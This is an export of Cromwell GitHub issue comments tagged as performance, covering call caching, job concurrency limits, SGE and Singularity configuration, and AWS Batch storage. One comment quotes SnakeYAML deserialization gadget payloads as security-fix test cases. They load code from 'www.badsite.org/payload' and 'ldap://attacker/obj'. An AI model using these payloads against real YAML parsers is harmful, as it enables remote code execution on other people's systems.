Some(1), attempt 1); [2022-12-15 21:28:26,54] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-SubWorkflowActor-SubWorkflow-main:-1:1 [788d8048]: Job results retrieved (CallCached): 'main.all_qced_sample_lists' (scatter index: Some(3), attempt 1); [2022-12-15 21:28:26,54] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-SubWorkflowActor-SubWorkflow-main:-1:1 [788d8048]: Job results retrieved (CallCached): 'main.all_qced_sample_lists' (scatter index: Some(2), attempt 1); [2022-12-15 21:28:26,55] [info] 788d8048-ef2b-4d7c-b3cb-6e04b3cbbdc2-SubWorkflowActor-SubWorkflow-main:-1:1 [788d8048]: Job results re",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:46076,cache,cache,46076,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,1,['cache'],['cache']
Performance,"> * cromwell v27; > * SGE backend; > * server mode; > ; > Cromwell timing diagram displays SGE queued (qw) status as Running. This increases difficulty of debugging (or evaluating) a tool, since we do not have a reliable and easy(!) way to look at timing. @LeeTL1220 hi，Have you solved this problem ？",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2464#issuecomment-732694657:95,queue,queued,95,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2464#issuecomment-732694657,1,['queue'],['queued']
Performance,"> 1. It looks like the perf tests were run on version `""cromwellVersion"": ""48-e0cee74-SNAP"",`, but I don't see that hash in the commit history here.; > ; > I just want to check that was the version you were expecting them to run against, since I would expect it to be a `49-...` hash (you presumably had to rebase onto develop to undo all of the not-quite-summarizer-fix changes)?. @cjllanwarne this is the proper version. I actually took your initial `cjl_summarization_queue` branch and made updates in it. Then I built it locally and pushed to my personal Dockerhub.; I only merged develop branch into this one before creating the PR. >I think we could make this process more efficient by only writing the IDs into the summary queue in the first place if we know we'll actually want to summarize them later on. Do you mean write only those IDs which have certain metadata key value? I'm not sure if this would give us some additional performance boost, since we'll need to check each record for matching our criteria.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5409#issuecomment-584879436:730,queue,queue,730,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5409#issuecomment-584879436,4,"['perform', 'queue']","['performance', 'queue']"
Performance,"> ; `tee` will cache the standard output of the program into a buffer, after using `sync`, it will brush the data from the buffer to disk, after that, nfs will synchronize to the remote service (nfs itself has a delay of a few seconds); so no matter whether it is `tee` and `sync`, or nfs there may be a problem, the best thing is to turn the`rc.tmp` to` rc` file operation to give a delay of a few seconds is to do it in the case of not changing the source code. It's a good idea to delay the `rc.tmp` to `rc` file operation for a few seconds without changing the source code.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1710994350:15,cache,cache,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7094#issuecomment-1710994350,1,['cache'],['cache']
Performance,"> > I have the same problem. Have you solved it?; > ; > I think it might be a bogus warning? My container seems to run correctly. Since I was using a Singularity image file, I couldn't get a Docker-hash, which resulted in call-cache not working. This is the key issue. Isn't the main reason we use server mode for call-cache",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6674#issuecomment-1047342504:227,cache,cache,227,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6674#issuecomment-1047342504,2,['cache'],['cache']
Performance,"> > I'm not sure if this would give us some additional performance boost, since we'll need to check each record for matching our criteria.; > ; > But sooner or later we have to do that anyway on the summarization side (and probably on the order of 99% of metadata doesn't need summarizing). By doing it before we write to the DB, I think we could avoid:; > ; > 1. Writing the entries we know don't need to be summarized to the summarization queue.; > 2. Reading the non-summarizable metadata _value_s from the database into Cromwell (and some of them are pretty big) - only to discard them when we read the key and discover it's not summarizable. I'm still reluctant to do that:; 1. Yes, but writing a single additional number per entry to a summary table is not nearly a huge overhead, taking into attention that, as you said, in the same transaction we are writing some huge metadata entries into the `metadata_entry` table.; 2. Summarizer works asynchronously and though I agree that we should keep it's performance good enough, moving metadata key filtering logic to the ""write-metadata-entry"" side of things may affect performance of running workflows.; > Reading the non-summarizable metadata _value_s from the database into Cromwell. Also, if my understanding is correct, this is how summarizer works right now. There are other possible things which we can do to optimize summarizer performance, one of which would be to add additional `metadata_key` column to our new queue table, and then allow summarizer to decide if it wants to fetch data from `metadata_entry` table based on that key. But this is food for thought for future optimizations.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5409#issuecomment-585322534:55,perform,performance,55,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5409#issuecomment-585322534,8,"['optimiz', 'perform', 'queue']","['optimizations', 'optimize', 'performance', 'queue']"
Performance,"> AWSBATCH; 2018-06-11 16:10:36,997 cromwell-system-akka.dispatchers.engine-dispatcher-36 INFO - WorkflowExecutionActor-ab42cf3c-726f-4148-a30f-0f907c843361 [UUID(ab42cf3c)]: Starting wf_hello.hello; 2018-06-11 16:10:37,958 cromwell-system-akka.dispatchers.engine-dispatcher-47 ERROR - Failed copying cache results for job BackendJobDescriptorKey_CommandCallNode_wf_hello.hello:-1:1, invalidating cache entry.; cromwell.core.CromwellFatalException: software.amazon.awssdk.services.s3.model.NoSuchKeyException: The specified key does not exist. (Service: S3Client; Status Code: 404; Request ID: 289B06CE5822B3C0); 	at cromwell.core.CromwellFatalException$.apply(core.scala:18); 	at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:38); 	at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:37); 	at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:413); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:43); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: software.amazon.awssdk.services.s",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3760:2306,concurren,concurrent,2306,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3760,1,['concurren'],['concurrent']
Performance,> Bunting on review because it looks like we are adding the test in #5408. Not the type of bird usually drawn to my PRs but I'll take it ![indigo bunting](https://pittsburghquarterly.com/media/k2/items/cache/ff0158c2594917cd6a9c4e297e8a8d7c_XL.jpg),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5406#issuecomment-584766720:202,cache,cache,202,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5406#issuecomment-584766720,1,['cache'],['cache']
Performance,"> Do we have a lot of users with UGER, external and internal?. I can only speak for internal: More and more ""Broad"" users are using Grid Engine, especially [UGER](https://intranet.broadinstitute.org/bits/service-catalog/compute-resources/high-performance-computing-uger), but not with cromwell, yet. DSP-methods have been big users of Grid Engine over the past few years, but mostly the older Sun Grid Engine, and with GATK-Queue. Meanwhile BITS is trying to get them to move over to a Univa Grid Engine installation BITS has called UGER. Unlike the older unlimited setup, UGER's setup has hard limits on the number of concurrent jobs that can be tracked by the Grid Engine scheduler, previously 100, now 1000. With the relaxing of the limit, plus the cromwell's `concurrent-job-limit` feature, this ticket a lower priority imho. Still, it ""would be nice"" if just like we submit in batches to JES, we also submitted in batches to other systems that support it including GridEngine/SLURM/PBS/etc.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1491#issuecomment-332393984:243,perform,performance-computing-uger,243,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1491#issuecomment-332393984,4,"['Queue', 'concurren', 'perform']","['Queue', 'concurrent', 'concurrent-job-limit', 'performance-computing-uger']"
Performance,"> Do we want to have an concurrency protection on this action (eg to run at most 1 docker build at a time?) to avoid awkward race conditions (or merge conflicts) in cromwhelm if two actions are competing to update the helm chart at the same time?. I have been exercising this condition fairly regularly over the last few days while pushing changes and it doesn't seem to cause any problems. The build takes a consistent 6 minutes; if I push 3 changes at 1 minute increments, the builds run on parallel nodes and finish in the order they started.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6739#issuecomment-1105713043:24,concurren,concurrency,24,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6739#issuecomment-1105713043,2,"['concurren', 'race condition']","['concurrency', 'race conditions']"
Performance,"> Hey @kevin-furant, we had success getting it working. Are you seeing any weird logs? Is your Cromwell instance correctly resolving the docker digest (so it's requesting an image like ""imageName@sha256:ad21[...]"")?. We cannot use Docker on our cluster, I use a Singularity image file; ` SGE {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {. # Limits the number of concurrent jobs; concurrent-job-limit = 300. # If an 'exit-code-timeout-seconds' value is specified:; # - check-alive will be run at this interval for every job; # - if a job is found to be not alive, and no RC file appears after this interval; # - Then it will be marked as Failed.; # Warning: If set, Cromwell will run 'check-alive' for every job at this interval. exit-code-timeout-seconds = 120. runtime-attributes = """"""; Int cpu = 1; Float memory_gb = 1; String? docker_mount; String? docker; String? sge_queue = ""bc_b2c_rd.q,b2c_rd_s1.q""; String? sge_project = ""P18Z15000N0143""; """""". runtime-attributes-for-caching {; # singularity_image: true; }. submit = """"""; qsub \; -terse \; -V \; -b y \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; ${""-l vf="" + memory_gb + ""g""} \; ${""-l p="" + cpu } \; ${""-q "" + sge_queue} \; ${""-P "" + sge_project} \; /usr/bin/env bash ${script}; """""". submit-docker = """"""; IMAGE=/zfsyt1/B2C_RD_P2/USER/fuxiangke/wgs_server_mode_0124/${docker}.sif; qsub \; -terse \; -V \; -b y \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; ${""-l vf="" + memory_gb + ""g""} \; ${""-l p="" + cpu } \; ${""-q "" + sge_queue} \; ${""-P "" + sge_project} \; singularity exec --containall --bind ${docker_mount}:${docker_mount} --bind ${cwd}:${cwd} --bind ${cwd}:${docker_cwd} $IMAGE /bin/bash ${script}; """""". kill = ""qdel ${job_id}""; check-alive = ""qstat -j ${job_id}""; job-id-regex = ""(\\d+)""; }; `; ` runtime {; docker: ""qc_align""; docker_mount: ""/zfsyt1/B2C_RD_P2/USER/fuxiangke/wgs_server_mode_0124""; cpu: cpu; memory: ""~{mem}GB"" ; };",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5405#issuecomment-1047370680:415,concurren,concurrent,415,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5405#issuecomment-1047370680,2,['concurren'],"['concurrent', 'concurrent-job-limit']"
Performance,"> Hi Luyu, Thanks for the feedback. This is an interesting case. Normally if there is a few minutes gap between workflows the instances will be terminated by batch and the disks will be reclaimed so each workflow starts from scratch. However in your case there isn’t a pause in work long enough for Batch to shut down the instances. Also because these files are written to a mounted disk they are not deleted when the container terminates. I think this fix is simple if I add a cleanup step. I will do this ASAP. Thanks, Mark; > […](#); > On Sat, Oct 24, 2020 at 5:27 AM Luyu ***@***.***> wrote: Hi, I have set up a Cromwell platform on AWS batch according to https://docs.opendata.aws/genomics-workflows/orchestration/cromwell/cromwell-overview/ If I run GATK Best Practice pipeline for one sample, it works perfectly. However, when I ran this pipeline for 10+ samples concurrently, many AWS EC2 instances were re-used by AWS batch. Cromwell didn't clean up the localized S3 files and output files produced by previous tasks. This quickly inflated EBS cost when EBS autoscaling is enabled. One of my instances went up to 9.1TB and hit the upper bound for autoscaling, then the running task failed due to no space. I have checked Cromwell documents and some materials from AWS, as well as issue #4323 <#4323>. But none of them works for me. Thank you in advance for any suggestions. — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5974>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AF2E6EPKRNY6TFQPVAG2Q4DSMKMZZANCNFSM4S5OX5IA> . Hi Mark,. Thanks for your reply. I think I find a workaround (probably close to a real solution). I find the script for a container to run is generated at https://github.com/broadinstitute/cromwell/blob/491082aa3e5b3bd5657f339c959260951333e638/backend/src/main/scala/cromwell/backend/standard/StandardAsyncExecutionActor.scala#L435 . The `SCRIPT_EPILOGUE` has a default value `sy",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-716242694:870,concurren,concurrently,870,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5974#issuecomment-716242694,2,['concurren'],['concurrently']
Performance,"> However, I understand your concerns about docker. We are happy to do a little extra work to make this PR palatable to your team, perhaps by adding warnings in the appropriate places?. I am not part of the cromwell team, so it is not up to me whether this gets merged or not. However, allowing softlinks in containers will give errors for a lot of people who are not aware of the implementation details. Those people *will* post bug reports on the cromwell bug tracker. If this were to work, I guess the best way is to allow a config override ""allow-softlinking-in-containers"" with a huge warning in the documentation. That way the unaware will not get caught by surprise as active action needs to be taken to run into this error. > Reducing the number of threads would also reduce the task throughput and limit performance. Offtopic: This is not necessarily always the case. Cromwell uses a very large number of threads by default if the server has a lot of cores. Even with the soft-linking strategy I would recommend playing with that setting a little. More threads is not necessarily better. Task and context switching are expensive operations too, not too mention the ability of the filesystem to handle multiple requests at once.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1046559957:792,throughput,throughput,792,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6676#issuecomment-1046559957,2,"['perform', 'throughput']","['performance', 'throughput']"
Performance,"> I believe the next steps for this PR and its sibling are being discussed outside of GitHub. Somewhat. We have a thread open with Kyle on high-level details of performance, complexity, and support. I'd still appreciate a review on the code submitted so far. Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6432#issuecomment-895441231:161,perform,performance,161,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6432#issuecomment-895441231,1,['perform'],['performance']
Performance,"> I recommend using the call cache diff endpoint; > ; > ```; > GET ​/api​/workflows​/v1/callcaching​/diff; > ```; > ; > > This endpoint returns the hash differences between 2 completed (successfully or not) calls. Thank you, i will try it",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-823727881:29,cache,cache,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-823727881,1,['cache'],['cache']
Performance,"> I sometimes seem to be getting timeouts on smaller databases (300 seconds for a 2GB file), I think this might be due to Cromwell terminating incorrectly and it not starting up again. If the database is on NFS it might not be cached locally. And with a 100mbit connection it might happen. But this is just speculation. Anyway, I hope my PR on liquibase gets merged soon so I can continue working on the problem.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-629968131:227,cache,cached,227,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-629968131,1,['cache'],['cached']
Performance,"> I'm not inclined to add a glob test as I don't think it's really adding any value. The value which I think it would add is guaranteeing that the aliased task directories really are distinct. Eg this particular test case would pass if the tasks were ran in serial (cf. our ""concurrent job start limit"" option for AWS tests)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4840#issuecomment-484259156:275,concurren,concurrent,275,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4840#issuecomment-484259156,1,['concurren'],['concurrent']
Performance,"> I'm not sure if this would give us some additional performance boost, since we'll need to check each record for matching our criteria. But sooner or later we have to do that anyway on the summarization side (and probably on the order of 99% of metadata doesn't need summarizing). By doing it before we write to the DB, I think we could avoid:. 1. Writing the entries we know don't need to be summarized to the summarization queue.; 2. Reading the non-summarizable metadata _value_s from the database into Cromwell (and some of them are pretty big) - only to discard them when we read the key and discover it's not summarizable.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5409#issuecomment-584890956:53,perform,performance,53,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5409#issuecomment-584890956,2,"['perform', 'queue']","['performance', 'queue']"
Performance,"> I'm wondering - what would be the return code for the second worker that cannot create the lock? What in the above says ""Try to make the lock, if it doesn't work, come back and try again (and do this until the container is available.). This is the default behaviour of `flock`, I believe. My flock man page says: ""By default, if the lock cannot be immediately acquired, flock waits until the lock is available."". > Overall I think this is a really important thing to think about - aside from cluster resources, if you are pulling an image from a remote registry, that might have negative consequences for the registry. My understanding of Singularity was that the actual *pulling* would be cached using the Singularity cache, and only the *building* would be duplicated. Is this not right? In any case, this will avoid smashing the Singularity cache at least. > I also wouldn't be sparse with the variables, for some future user coming to read this, I would use --exclusive instead of -x and then --unlock instead of -u so it's explicitly clear. Agreed! I'll edit the OP.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-509639973:692,cache,cached,692,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-509639973,6,['cache'],"['cache', 'cached']"
Performance,"> It looks like upgrading from `Constructor` to `SafeConstructor` does not make much difference. I wonder if it is due to Scala not having a `javax.script.ScriptEngineManager` or other difference in class loading?. Previously we (cwlviewer) were using a plain `Yaml()` object which defaults to the `Constructor`: https://bitbucket.org/asomov/snakeyaml/src/5e41c378e49c9b363055ac8b0386b69cb3f389d2/src/main/java/org/yaml/snakeyaml/Yaml.java#lines-66 and this led to the vulnerability. Perhaps you can construct a Scala proof of concept (and therefore test) by serializing the Scala equivalent of ; ``` java; URL[] urls = new URL[1];; urls[0] = new URL(""https://www.badsite.org/payload"");; ScriptEngineManager foo = new ScriptEngineManager(new java.net.URLClassLoader(urls));; yaml.dump(foo);; ```. https://github.com/mbechler/marshalsec/blob/master/marshalsec.pdf suggests the following yaml to try as well:; ``` yaml; !!com.sun.rowset.JdbcRowSetImpl; dataSourceName: ldap://attacker/obj; autoCommit: true; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932291331:205,load,loading,205,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6510#issuecomment-932291331,1,['load'],['loading']
Performance,> Just curious if putting a sleep [here](https://github.com/broadinstitute/cromwell/blob/2d8ff3b0962bbe84828445fd3ac77d2379e499c2/supportedBackends/aws/src/main/scala/cromwell/backend/impl/aws/AwsBatchAsyncBackendJobExecutionActor.scala#L341) or [here](https://github.com/broadinstitute/cromwell/blob/2d8ff3b0962bbe84828445fd3ac77d2379e499c2/supportedBackends/aws/src/main/scala/cromwell/backend/impl/aws/AwsBatchJob.scala#L198) are viable solutions until something more generic in the core of Cromwell can be implemented. Any update and interim solution available? I am curious if there is an alternative like python aiohttp concurrent requests number limit rather than sleep.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-440734911:626,concurren,concurrent,626,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-440734911,1,['concurren'],['concurrent']
Performance,"> My understanding of Singularity was that the actual pulling would be cached using the Singularity cache, and only the building would be duplicated. Is this not right? In any case, this will avoid smashing the Singularity cache at least. I think that if it's the case that the (finished image) isn't in the cache, all of the workers would start building (and then not copy to the final thing given that another worker got there first). It's been a while, so it might be good to check with others on slack.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-509643616:71,cache,cached,71,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-509643616,4,['cache'],"['cache', 'cached']"
Performance,"> Nice! I really appreciate the attention to how we're handling this large amount of data.; > ; > How are you thinking clients will interact with this service?. For now, I'm just thinking that clients will get a reference to this actor and call `getSku` repeatedly, as needed. Still a little up in the air as these clients don't yet exist. . Should perform fine with only the public cost catalog, since we're limited to one batch of requests every 24 hours. IMO fancier async stuff is good but should come later.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7507#issuecomment-2307714053:349,perform,perform,349,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7507#issuecomment-2307714053,1,['perform'],['perform']
Performance,"> One thing you can try is setting `concurrent-job-limit` to 2 or similar so that only a small, fixed number of jobs launch simultaneously. That does work with the local Docker backend because it's a universal Cromwell property, independent of backends.; > ; > #1841. that is something that I can do indeed, but If I have, let say one havy task and on easy task and I want to launch nor more than one havy task at a time and as many as needed easy tasks, `concurrent-job-limit` will not help unfortunatly. Every task, both easy and havy will be computed one by one, without possible parallelisation. So it is really subotimal.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4413#issuecomment-1032794448:36,concurren,concurrent-job-limit,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4413#issuecomment-1032794448,2,['concurren'],['concurrent-job-limit']
Performance,"> So a docker_pull command would have to be executed at task execution time. But then it is redundant. This command can be part of the submit script. I looked into this a while ago so I might be wrong, but I think a `docker_pull` hook would still be useful, even at runtime, because it would be run only once, and *not* scattered, unlike the actual `submit_docker` hook. This would give it time to pull/convert the container without any race condition issues, meaning we don't have to use `flock` or any of that messy bash. The execution graph would look like:; ```; pull_docker; ⭩ ↓ ⭨; submit submit submit; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-627386598:437,race condition,race condition,437,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-627386598,1,['race condition'],['race condition']
Performance,"> Sounds good, except maybe the per-batch timing should include lookup, even if the per workflow should exclude?. Yeah good point. I noticed on Alpha that the lookup portion was only taking 20 milliseconds with the optimized SQL, so I kind of forgot about it on account of insignificance.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6347#issuecomment-841343968:215,optimiz,optimized,215,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6347#issuecomment-841343968,1,['optimiz'],['optimized']
Performance,"> There is one I'm having trouble googling a fix for. I can't figure out how to shut off PostgreSQL exceptions printing possibly sensitive row contents via their messages. I wouldn't be surprised if this is baked into the JDBC layer. We could try something like this:; ```; diff --git a/database/sql/src/main/scala/cromwell/database/slick/SlickDatabase.scala b/database/sql/src/main/scala/cromwell/database/slick/SlickDatabase.scala; index 5d28cf1..5b0e227 100644; --- a/database/sql/src/main/scala/cromwell/database/slick/SlickDatabase.scala; +++ b/database/sql/src/main/scala/cromwell/database/slick/SlickDatabase.scala; @@ -11,6 +11,7 @@ import net.ceedubs.ficus.Ficus._; import org.slf4j.LoggerFactory; import slick.basic.DatabaseConfig; import slick.jdbc.{JdbcCapabilities, JdbcProfile, TransactionIsolation}; +import org.postgresql.util.{PSQLException, ServerErrorMessage}. import scala.concurrent.duration._; import scala.concurrent.{Await, ExecutionContext, Future}; @@ -199,6 +200,8 @@ abstract class SlickDatabase(override val originalDatabaseConfig: Config) extend; case _ => /* keep going */; }; throw rollbackException; + case pe: PSQLException =>; + throw new PSQLException(new ServerErrorMessage(s""Oh no, a postgres error occurred! ${pe.getMessage}"")); }; }(actionExecutionContext); }; ```; only with some on-the-fly modification of the error message instead of my dummy string. This compiles for me, but I'm not sure how to test it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4919#issuecomment-504487606:893,concurren,concurrent,893,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4919#issuecomment-504487606,2,['concurren'],['concurrent']
Performance,"> There's quite a bit of debate internally about this PR. Some team members remain deeply uncomfortable with how locking is handled, but it would take us a lot of time to research and recommend a better solution. If I may reiterate: by default this does not break anything for anyone. The locking only happens when `cached-copy` is set in the config consciously by the user. I maintain [my own patched jar for cromwell](https://github.com/rhpvorderman/cromwell/releases/tag/41-LUMC-patches), because this is taking very long already. We are running this in production and not experiencing problems. (There are only problems when the maximum number of hardlinks is reached, then cromwell defaults to copying again. It does not break anything, but it will use a lot of space on the filesystem and it will slowdown pipeline runs. I am working on a fix for that as well.)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-504046142:316,cache,cached-copy,316,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-504046142,1,['cache'],['cached-copy']
Performance,"> This fixes the problem at the point of expression evaluation... it seems like it might be easier (and a lot less fiddly?) to do the relative file resolution much earlier, at the point that inputs are being read in to the workflow in the first place. > The ValidatedWomNamespace produced as part of workflow materialization contains a womValueInputs field... I wonder whether performing this mapping as part of creating that validated set of inputs would work?. Great suggestion. I will take a look at this. I can checkout the test case on a new branch and try to hack there. One of the catches will be that this resolving will be backend dependent. In the current situation the input expressions are evaluated first, and after that the inputs are resolved. (This makes sense because input can also be something like `baseDir + ""/my_file.txt""`, which needs to be evaluated). But indeed this could be bypassed by doing this already at the workflow level, before it gets passed down to the task level. I will take a look at this. If it does not work, (or work easily) then I will report back here.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5478#issuecomment-618838024:377,perform,performing,377,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5478#issuecomment-618838024,1,['perform'],['performing']
Performance,"> This is a common configuration that prohibits docker. ""Local"" and SGE/HPC are two separate issues. SGE (and all HPC) backends can already run without docker. When setting up the backend, just don't add a `submit-docker` config variable nor a `docker` runtime attribute to the backend's configuration. Docs for new local/HPC backends are documented under the title ""[SGE](https://cromwell.readthedocs.io/en/stable/backends/SGE/)"". Separately, there is the issue that cromwell is pre-loaded with a default ""Local"" backend. This ""Local"" backend [is docker enabled](https://github.com/broadinstitute/cromwell/blob/a3c5e055a5a4c6793a526689d38577c2f122bc95/core/src/main/resources/reference_local_provider_config.inc.conf#L9-L34). The simplest workaround today is to create another backend ""Local-NoDocker"" or similar. Or if one wants to just change the existing ""Local"" backend they can use a config like:. ```hocon; include required(classpath(""application"")); backend.providers.Local.config.runtime-attributes=""""; backend.providers.Local.config.submit-docker=null; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1832#issuecomment-423240258:484,load,loaded,484,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1832#issuecomment-423240258,2,['load'],['loaded']
Performance,"> This is unusual, I have successfully call cached files of 1 TB in testing so I don’t know if size is the problem. Does the issue persist after restarting the server? I committed a change to the develop branch a few weeks ago that does a better job of cleaning up the copying resources. If the restart solves the problem then you may want to build from the develop branch until the next release is sent out. Also, is the bucket containing the source file the same bucket as the workflow bucket? If not, are they in the same region?; > […](#); > On Wed, Nov 11, 2020 at 4:28 AM Luyu ***@***.***> wrote: Hi, The improved multipart copying (api: CreateMultipartUpload) doesn't work for me. The cromwell server always checks the existence of the cached file before the copying finishes. In Cromwell v51 and before, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo 